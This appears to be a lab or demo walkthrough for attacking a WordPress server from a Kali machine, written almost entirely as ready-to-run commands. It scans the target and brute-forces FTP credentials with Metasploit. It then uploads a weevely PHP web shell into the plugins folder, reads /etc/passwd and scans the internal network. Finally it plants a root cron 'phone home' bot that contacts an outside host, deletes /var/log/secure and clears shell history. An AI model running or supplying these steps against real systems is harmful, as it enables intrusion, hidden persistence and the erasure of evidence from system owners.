# Attack the WP Instance from the KALI System

1. SSH into the Kali Instance and run the from command line run the following chunks of code:

```
sudo su
export TARGET_IP=3.15.211.63 # <--Set this to the External IP Address of the WP Instance
```

Perform a nmap scan

```
nmap -Pn -A -T4 $TARGET_IP
```

Use nikto to scan the Web Server

```
nikto -h $TARGET_IP
```

Set the WPscan API token. You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up. I purposely didn't want to save it to github or have it show in the recording of the demo.

```
bash
export TOKEN=     #Set this variable to your API token
exit
```

Run wpscan on your wordpress instance

```
wpscan --url $TARGET_IP/wordpress --enumerate p --api-token $TOKEN
```

Fetch a password list and add the WordPress password to the bottom to allow the brute force attack to be successful. Use Metasploit to perform the brute forcing.

```
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
head -n 15 ftp-betterdefaultpasslist.txt > passwordlist.txt
echo "root:password123456" >> passwordlist.txt
sed -i 's/:/ /' passwordlist.txt
msfconsole -x "use auxiliary/scanner/ftp/ftp_login; set BRUTEFORCE_SPEED 3; \
  set STOP_ON_SUCCESS true; set RHOSTS $TARGET_IP; \
  set USERPASS_FILE passwordlist.txt; run; exit"
```

Set up a web shell with the compromised FTP credential

```
git clone https://github.com/epinna/weevely3.git
apt-get install -y python3 python3-pip curl
cd weevely3/
pip3 install -r requirements.txt --upgrade
./weevely.py generate mypassword maint.php
ftp -inv $TARGET_IP <<EOF
user root password123456
passive
cd /var/www/html/wordpress/wp-content/plugins/
put maint.php
bye
EOF
./weevely.py http://$TARGET_IP/wordpress/wp-content/plugins/maint.php mypassword
```

Run these commands on the webshell

```
whoami
uname -a
:audit_etcpasswd
cd /var/www/html
:file_download wordpress-4.4.tar.gz /tmp/wordpress-4.4.tar.gz
cd /var/www/html/wordpress/wp-content/plugins
:net_scan 172.31.44.1-172.31.44.10 255.255.255.0 1-666
```

SSH back into the WP instance and as root, make a bot that phones home:
```
sudo su
rm -f /var/www/html/wordpress/wp-content/plugins/phone
cp /usr/bin/nmap /var/www/html/wordpress/wp-content/plugins/phone
cat << "EOF" > /sbin/phonehome
HOMEBASE=$(curl -s http://www.malwaredomainlist.com/updatescsv.php | head -n 1 | cut -d"," -f3 | tr -d "\42")
/var/www/html/wordpress/wp-content/plugins/phone -sT $HOMEBASE -p 666 >> /var/www/html/wordpress/wp-content/plugins/instant-web-highlighter/logs.txt
rm -f /var/log/secure
history -c
EOF
chmod +x /sbin/phonehome
touch /var/spool/cron/root
echo "*/5 * * * * /sbin/phonehome > /dev/null" >> /var/spool/cron/root
history -c
```
